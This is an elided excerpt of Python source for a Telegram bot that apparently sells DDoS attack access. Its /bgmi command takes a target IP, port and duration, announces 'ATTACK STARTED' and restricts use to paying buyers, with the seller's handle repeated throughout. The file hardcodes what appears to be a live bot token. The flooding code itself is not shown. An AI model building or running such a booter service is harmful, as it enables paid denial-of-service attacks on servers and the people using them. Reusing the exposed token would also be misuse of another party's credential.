...
bot = telebot.TeleBot('7157503218:AAHFtHy4JTrc82QRhlr47eiL07VLhr9ssXU')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "You have not purchased yet purchase now from:-@dkgaming_p1_D5 ✅."
...
def clear_users_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:-@dkgaming_p1_D5 ✅ 🙇."
    bot.reply_to(message, response)
...
REGARDS -@dkgaming_p1_D5 ✅''')
            except Exception as e:
                print(f"Failed to send message to {user_id}: {e}")
        time.sleep(800)  # Wait 5 minutes before sending the message again
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @dkgaming_p1_D5✅"
    bot.reply_to(message, response)
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 800:
                ...
                attack_start_message = (
                    ...
                    f"𝐏𝐨𝐫𝐭: {port}\n"
                    f"𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n"
                    f"𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of :-@dkgaming_p1_D5 ✅."
                )
        ...
        response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:-@dkgaming_p1_D5 ✅"
